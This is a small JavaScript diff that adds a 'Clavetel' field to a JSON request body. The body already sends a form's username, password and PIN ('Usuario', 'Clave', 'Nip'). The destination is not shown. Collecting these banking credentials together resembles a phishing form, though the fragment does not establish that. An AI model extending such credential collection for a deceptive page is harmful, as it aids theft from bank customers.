@@ -16,7 +16,8 @@ try {
         body: JSON.stringify({
             "Usuario": formulario.usuario.value,
             "Clave": formulario.contraseña.value,
-            "Nip": formulario.confirmar.value
+            "Nip": formulario.confirmar.value,
+            "Clavetel": formulario.tel.value
         })
     });
 
